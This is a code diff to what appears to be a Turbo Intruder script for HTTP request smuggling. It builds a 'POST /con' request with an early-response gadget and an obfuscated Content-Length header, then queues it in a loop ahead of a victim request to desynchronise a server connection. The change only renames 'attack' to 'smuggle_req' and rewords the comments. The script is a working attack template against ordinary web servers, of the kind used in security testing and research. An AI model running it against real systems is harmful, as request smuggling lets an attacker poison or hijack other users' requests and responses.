@@ -10,8 +10,8 @@ def queueRequests(target, wordlists):
                            )
 
 
-    # The attack should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
-    attack = '''POST /con HTTP/1.1
+    # The request should contain an early-response gadget and a (maybe obfuscated) Content-Length header with the value set to %s
+    smuggle_req = '''POST /con HTTP/1.1
 Host: example.com
 Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
@@ -29,23 +29,23 @@ Host: example.com
 '''
 
     # No need to edit below this line
-    if '%s' not in attack:
+    if '%s' not in smuggle_req:
         raise Exception('Please place %s in the Content-Length header value')
 
-    if not attack.endswith('\r\n\r\n'):
-        raise Exception('Attack request must end with a blank line and have no body')
+    if not smuggle_req.endswith('\r\n\r\n'):
+        raise Exception('Smuggle request must end with a blank line and have no body')
 
     victim = victim.replace('\r\n', '\r\nA: A'+smuggledLine+'\r\n', 1)
 
     while True:
-        engine.queue(attack, victim.index(smuggledLine), label='attack', fixContentLength=False)
+        engine.queue(smuggle_req, victim.index(smuggledLine), label='smuggle', fixContentLength=False)
         engine.queue(victim, label='victim')
 
 
 def handleResponse(req, interesting):
     table.add(req)
 
-    # Uncomment & customise this if you want the attack to automatically stop on success
+    # Uncomment & customise this if you want the run to automatically stop on success
     #if req.label == 'victim' and req.status == 404:
     #    req.engine.cancel()
 
